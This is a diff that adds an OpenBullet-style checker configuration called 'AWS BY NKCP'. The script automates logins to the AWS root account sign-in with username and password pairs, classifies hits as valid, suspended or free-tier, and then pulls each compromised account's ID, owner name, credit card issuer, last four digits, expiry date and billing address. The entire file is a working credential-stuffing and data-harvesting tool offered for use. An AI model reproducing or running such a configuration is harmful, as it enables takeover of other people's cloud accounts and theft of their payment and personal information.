@@ -1,0 +1,245 @@
+[SETTINGS]
+{
+  "Name": "AWS BY NKCP ",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2021-08-13T15:17:05.0612122+00:00",
+  "AdditionalInfo": "",
+  "Author": "NKCP",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Redirect_Home REQUEST GET "https://console.aws.amazon.com/billing/home?region=us-east-2&state=hashArgs%23%2Fpaymentmethods" AutoRedirect=FALSE 
+  
+  HEADER "Host: console.aws.amazon.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "DNT: 1" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Referer: https://console.aws.amazon.com/billing/home?region=us-east-2" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+
+#Address PARSE "<HEADERS(Location)>" LR "" "" CreateEmpty=FALSE -> VAR "Address" 
+
+#ID PARSE "<Address>" LR "SignedHeaders=host&client_id=arn%3Aaws%3Aiam%3A%3A" "%3Auser%2Fport" CreateEmpty=FALSE -> VAR "ID" 
+
+#Challenge PARSE "<Address>" LR "auth&code_challenge=" "&code_challenge_method" CreateEmpty=FALSE -> VAR "Challenge" 
+
+#Redirected_Address REQUEST GET "<Address>" AutoRedirect=FALSE 
+  
+  HEADER "Host: us-east-1.signin.aws.amazon.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "DNT: 1" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+
+#Address_2 PARSE "<HEADERS(Location)>" LR "" "" CreateEmpty=FALSE -> VAR "Add2" 
+
+#Main PARSE "<COOKIES(aws-ubid-main)>" LR "" "" CreateEmpty=FALSE -> VAR "Main" 
+
+#Redirected_Address_2 REQUEST GET "<Add2>" AutoRedirect=FALSE 
+  
+  HEADER "Host: signin.aws.amazon.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "DNT: 1" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Cookie: aws-ubid-main=<Main>" 
+
+#Address_3 PARSE "<HEADERS(Location)>" LR "" "" -> VAR "Add3" 
+
+#Redirected_Address_3 REQUEST GET "<Add3>" 
+  
+  HEADER "Host: signin.aws.amazon.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "DNT: 1" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Cookie: aws-ubid-main=<Main>" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+
+#token PARSE "<SOURCE>" CSS "[name=csrf_token]" "content" -> VAR "Token" 
+
+#Session PARSE "<SOURCE>" LR "<meta name=\"session_id\" content=\"" "\" />" -> VAR "Session" 
+
+#signin REQUEST POST "https://signin.aws.amazon.com/signin" 
+  CONTENT "action=authenticateRoot&email=<USER>&password=<PASS>&redirect_uri=https%3A%2F%2Fconsole.aws.amazon.com%2Fbilling%2Fhome%3Fregion%3Dus-east-2%26state%3DhashArgs%2523%252Fpaymentmethods%26isauthcode%3Dtrue&client_id=arn%3Aaws%3Aiam%3A%3A<ID>%3Auser%2Fportal-aws-auth&csrf=<Token>&sessionId=<Session>&metadata1=&code_challenge=<Challenge>&code_challenge_method=SHA-256&mfaSerial=undefined" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: signin.aws.amazon.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36" 
+  HEADER "Accept: */*" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "Origin: https://signin.aws.amazon.com" 
+  HEADER "DNT: 1" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Referer: <Add3>" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Invalid request" 
+    KEY "Your authentication information is incorrect. Please try again" 
+    KEY "{\"state\":\"FAIL\"," 
+    KEY "\"AuthenticationFailureType\":" 
+  KEYCHAIN Failure OR 
+    KEY "\",\"Captcha\":\"true\",\"CaptchaURL\":\"" 
+    KEY "CaptchaURL\":\"https://opfcaptcha" 
+  KEYCHAIN Custom "Suspended" OR 
+    KEY "{\"AuthenticationFailureType\":\"Suspended\"}}" 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "{\"state\":\"SUCCESS\",\"properties\":{\"RedirectTo\":\"https://portal.aws.amazon.com/billing/signup/resume" 
+  KEYCHAIN Success OR 
+    KEY "\":{\"RedirectTo\":\"" 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "{\"state\":\"SUCCESS\",\"properties\":{\"RedirectTo\":\"https://portal.aws.amazon.com/billing/signup?type\\u003dresubscribe" 
+
+#urt PARSE "<SOURCE>" LR "{\"state\":\"SUCCESS\",\"properties\":{\"RedirectTo\":\"" "\"}}" CreateEmpty=FALSE -> VAR "urt" 
+
+#Translate FUNCTION Translate StopAfterFirstMatch=FALSE 
+  KEY "\\u003d" VALUE "=" 
+  KEY "\\u0026" VALUE "&" 
+  "<urt>" -> VAR "HOME" 
+
+#HOME REQUEST GET "<HOME>" ReadResponseSource=FALSE 
+  
+  HEADER "Host: console.aws.amazon.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "DNT: 1" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Referer: https://signin.aws.amazon.com/" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+
+#xsrf PARSE "<HEADERS(x-awsbc-xsrf-token)>" LR "" "" CreateEmpty=FALSE -> VAR "Csrf" 
+
+#account REQUEST GET "https://console.aws.amazon.com/billing/rest/v1.0/account" 
+  
+  HEADER "Host: console.aws.amazon.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36" 
+  HEADER "Accept: */*" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Referer: https://console.aws.amazon.com/billing/home?region=us-east-2" 
+  HEADER "x-awsbc-xsrf-token: <Csrf>" 
+  HEADER "x-AWSBillingConsole-Region: us-east-1" 
+  HEADER "DNT: 1" 
+  HEADER "Connection: keep-alive" 
+
+#accountStatus PARSE "<SOURCE>" JSON "accountStatus" -> CAP "accountStatus" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "\"accountStatus\":\"Active\"" 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "\"accountStatus\":\"Suspended\"" 
+
+#ACD PARSE "<SOURCE>" JSON "registrationDate" CreateEmpty=FALSE -> VAR "ACD" 
+
+#Account_Creation_Date FUNCTION DateToUnixTime 
+
+#Account-Id PARSE "<SOURCE>" JSON "accountId" CreateEmpty=FALSE -> CAP "Account-Id" 
+
+#Name_On_Account PARSE "<SOURCE>" JSON "fullName" CreateEmpty=FALSE -> CAP "Name On Account" 
+
+#Date PARSE "<HEADERS(Date)>" LR "" "" CreateEmpty=FALSE -> VAR "Date" 
+
+#Get_Payment_Information REQUEST POST "https://console.aws.amazon.com/billing/rest/pig-proxy" 
+  CONTENT "{\"headers\":{\"Content-Type\":\"application/json\",\"X-Amz-Date\":\"<Date>\",\"X-Amz-Target\":\"AWSPaymentInstrumentGateway.Find\"},\"content\":{\"Operation\":\"com.amazon.aws.payments.gateway.coral.paymentinstrument.operations#Find\",\"Service\":\"com.amazon.aws.payments.gateway.coral.paymentinstrument.service#AWSPaymentInstrumentGateway\",\"Input\":{\"filter\":{\"__type\":\"com.amazon.aws.payments.gateway.coral.paymentinstrument.filters#ByAccountIdAndPaymentMethod\",\"accountId\":\"<Account-Id>\",\"paymentMethod\":\"CreditCard\"},\"pageSize\":250}},\"region\":\"us-east-1\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: console.aws.amazon.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Operation: AWSPaymentInstrumentGateway.Find" 
+  HEADER "x-awsbc-xsrf-token: <Csrf>" 
+  HEADER "x-AWSBillingConsole-Region: us-east-1" 
+  HEADER "Origin: https://console.aws.amazon.com" 
+  HEADER "DNT: 1" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Referer: https://console.aws.amazon.com/billing/home?" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "\"fraudValidationStatus\":\"Valid\"" 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "\"fraudValidationStatus\":\"Invalid\"" 
+
+#Card_Type PARSE "<SOURCE>" JSON "issuer" Recursive=TRUE CreateEmpty=FALSE -> CAP "Card Type" 
+
+#Last_Four_Digits PARSE "<SOURCE>" JSON "tail" Recursive=TRUE CreateEmpty=FALSE -> CAP "Last Four Digits" 
+
+#Expiration_Month PARSE "<SOURCE>" JSON "expirationMonth" Recursive=TRUE CreateEmpty=FALSE -> CAP "Expiration Month" 
+
+#Expiration_Year PARSE "<SOURCE>" JSON "expirationYear" Recursive=TRUE CreateEmpty=FALSE -> CAP "Expiration Year" 
+
+#Get_Address REQUEST GET "https://console.aws.amazon.com/billing/rest/v1.0/creditcards/address?type=CONTACT" 
+  
+  HEADER "Host: console.aws.amazon.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "x-awsbc-xsrf-token: <Csrf>" 
+  HEADER "x-AWSBillingConsole-Region: us-east-1" 
+  HEADER "DNT: 1" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Referer: https://console.aws.amazon.com/billing/home?region=us-east-2" 
+
+#fullName PARSE "<SOURCE>" JSON "fullName" Recursive=TRUE CreateEmpty=FALSE -> CAP "fullName" 
+
+#Billing_Address PARSE "<SOURCE>" JSON "addressLine1" Recursive=TRUE CreateEmpty=FALSE -> CAP "Billing Address" 
+
+#city PARSE "<SOURCE>" JSON "city" Recursive=TRUE CreateEmpty=FALSE -> CAP "city" 
+
+#state PARSE "<SOURCE>" JSON "state" Recursive=TRUE CreateEmpty=FALSE -> CAP "state" 
+
+#ZipCode PARSE "<SOURCE>" JSON "postalCode" Recursive=TRUE CreateEmpty=FALSE -> CAP "ZipCode" 
+
+#Country PARSE "<SOURCE>" JSON "countryCode" Recursive=TRUE CreateEmpty=FALSE -> CAP "Country" 
+
